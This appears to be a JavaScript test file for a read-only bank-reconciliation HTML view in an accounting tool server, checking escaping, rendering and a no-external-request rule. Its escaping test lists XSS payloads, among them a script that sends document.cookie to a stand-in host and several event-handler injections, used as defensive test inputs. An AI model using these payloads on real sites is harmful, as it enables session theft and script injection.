import { test } from "node:test";
import assert from "node:assert/strict";
import { renderReconciliation, escapeHtml } from "../dist/ui/reconciliation.js";
import { uiTools } from "../dist/tools/ui.js";
import { allTools } from "../dist/server.js";

/** A reconciliation shaped like the real one, with field names taken from live data. */
const sample = (overrides = {}) => ({
  bankAccountId: 1338,
  bankAccountName: "drift",
  bankCurrency: "NOK",
  month: "2026-07",
  pendingTransactionCount: 2,
  pendingPostingCount: 1,
  pendingTransactions: [
    {
      id: 43063,
      amount: 112.02,
      currency: "NOK",
      transactionDate: "2026-07-31",
      description: "Utb. 2000014 Vippsnr 58977",
      paymentReference: null,
    },
    {
      id: 43064,
      amount: -250.5,
      currency: "NOK",
      transactionDate: "2026-07-30",
      description: "Europris Hommelvik",
      paymentReference: "KID0001",
    },
  ],
  pendingPostings: [
    {
      id: 118681,
      amount: 112.02,
      voucherNumber: "MV46-2026",
      postingDate: "2026-07-31",
      description: "Vipps-oppgjør",
    },
  ],
  ...overrides,
});

// Descriptions and payment references arrive from EHF documents and bank feeds, which is
// to say a counterparty writes them. The view renders inside the user's client, so an
// unescaped description is script injection with an external author — the one security
// property this file exists to hold.
test("every value from the API is escaped", () => {
  const payloads = [
    "</script><script>fetch('https://evil.example?c='+document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "'; alert(1); //",
    "<!--<script>alert(1)</script>-->",
  ];
  for (const payload of payloads) {
    const html = renderReconciliation(
      sample({
        pendingTransactions: [
          {
            id: 1,
            amount: 1,
            currency: "NOK",
            transactionDate: "2026-07-01",
            description: payload,
            paymentReference: payload,
          },
        ],
        pendingPostings: [
          { id: 2, amount: 1, voucherNumber: payload, postingDate: "2026-07-01", description: payload },
        ],
      }),
    );
    // No element may appear that this view does not itself emit. That catches an injected
    // tag regardless of which attribute or context it arrived through.
    const elements = [...html.matchAll(/<([a-z][a-z0-9]*)/gi)].map((m) => m[1].toLowerCase());
    const ours = new Set(["div", "style", "h2", "h3", "p", "label", "input", "span", "script", "em"]);
    for (const element of new Set(elements)) {
      assert.ok(ours.has(element), `payload injected a <${element}> element: ${payload}`);
    }
    // And exactly one script element: ours.
    assert.equal((html.match(/<script/g) ?? []).length, 1, `payload added a script: ${payload}`);
    // A handler counts only if it is a real ATTRIBUTE. Scanning tag text flags correctly
    // escaped output too — `title="&lt;img src=x onerror=alert(1)&gt;"` contains the
    // string `onerror=` inside a value, inert. So strip quoted values first; what remains
    // is the attribute names the browser will actually act on.
    for (const tag of html.match(/<[a-z][^>]*>/gi) ?? []) {
      const withoutValues = tag.replace(/"[^"]*"/g, '""').replace(/'[^']*'/g, "''");
      assert.ok(!/\son[a-z]+\s*=/i.test(withoutValues), `an event handler reached a tag: ${tag}`);
    }
    // And the payload must never survive verbatim: every "<" it contained is escaped.
    assert.ok(!html.includes(payload), `the payload appears unescaped: ${payload}`);
  }
});

test("escapeHtml handles the contexts it is used in", () => {
  assert.equal(escapeHtml('<a href="x">&\'</a>'), "&lt;a href=&quot;x&quot;&gt;&amp;&#39;&lt;/a&gt;");
  // Ampersand first, or every other entity gets double-escaped.
  assert.equal(escapeHtml("&lt;"), "&amp;lt;");
  assert.equal(escapeHtml(undefined), "");
  assert.equal(escapeHtml(null), "");
  assert.equal(escapeHtml(0), "0");
});

// A client renders this under a strict CSP, so anything fetched would silently fail — and
// an accounting view should not phone anywhere regardless.
test("the view makes no external request", () => {
  const html = renderReconciliation(sample());
  assert.ok(!/https?:\/\//.test(html), "the view must not reference any external URL");
  assert.ok(!/<link|<img|@import|url\(/i.test(html), "no external stylesheet, image or font");
});

test("the data is actually rendered, and the ids the matcher needs are present", () => {
  const html = renderReconciliation(sample());
  assert.match(html, /Vippsnr 58977/);
  assert.match(html, /MV46-2026/);
  assert.match(html, /data-id="43063"/);
  assert.match(html, /data-id="118681"/);
  // Norwegian amount formatting, because the figures should read the way the books do.
  // U+00A0 between amount and code, so they cannot wrap apart.
  assert.match(html, /112,02\u00a0NOK/);
  // And the call it points at is the real tool, with the account already filled in.
  assert.match(html, /reai_match_bank_transactions/);
  assert.match(html, /bankAccountId: 1338/);
});

// The failure that made this view worth building was a truncated column read as a complete
// one. A trimmed column must say so.
test("a trimmed column states the real total", () => {
  const many = Array.from({ length: 400 }, (_, i) => ({
    id: 1000 + i,
    amount: i,
    currency: "NOK",
    transactionDate: "2026-07-01",
    description: `row ${i}`,
  }));
  const html = renderReconciliation(sample({ pendingTransactions: many, pendingTransactionCount: 400 }));
  assert.match(html, /Showing 120 of 400/);
  assert.match(html, /400 unmatched transaction\(s\)/);
});

test("an empty or locked period says so rather than showing nothing", () => {
  const empty = renderReconciliation(
    sample({ pendingTransactions: [], pendingPostings: [], pendingTransactionCount: 0, pendingPostingCount: 0 }),
  );
  assert.match(empty, /Nothing unmatched on the bank side/);
  assert.match(empty, /Nothing unmatched on the ledger side/);

  const locked = renderReconciliation(sample({ closed: true }));
  assert.match(locked, /closed or locked/);
});

// The view is opt-in, and it must not quietly become a write path.
test("the UI tool is read-only, opt-in, and returns text alongside the resource", async () => {
  assert.equal(uiTools.length, 1, "one view, deliberately");
  const [tool] = uiTools;
  assert.equal(tool.name, "reai_reconcile_ui");
  assert.equal(tool.risk, "read", "selecting must not be a write");
  assert.ok(!tool.transmits, "nothing here leaves the tenant");
  // Not in the default surface: a client that cannot render it should never receive it.
  assert.ok(!allTools.some((t) => t.name === "reai_reconcile_ui"), "must be off by default");

  const result = await tool.handler(
    { bankAccountId: 1338, month: "2026-07", tenantId: 2634 },
    {
      client: { request: async () => ({ data: sample(), status: 200 }), deepLink: () => "link" },
      config: { writeMode: "read-only", tenantId: 2634 },
      session: {},
    },
  );
  const kinds = result.content.map((c) => c.type);
  assert.ok(kinds.includes("text"), "a client that ignores resources must still get an answer");
  assert.ok(kinds.includes("resource"), "and one that renders them gets the view");

  const text = result.content.find((c) => c.type === "text").text;
  // The numbers are the answer; the arrays are what the view is for.
  assert.match(text, /2 unmatched transaction\(s\) and 1 unmatched posting\(s\)/);
  assert.match(text, /reai_match_bank_transactions/);

  const resource = result.content.find((c) => c.type === "resource").resource;
  assert.equal(resource.mimeType, "text/html");
  assert.match(resource.uri, /^ui:\/\/reai\/reconciliation\/1338\/2026-07$/);
});
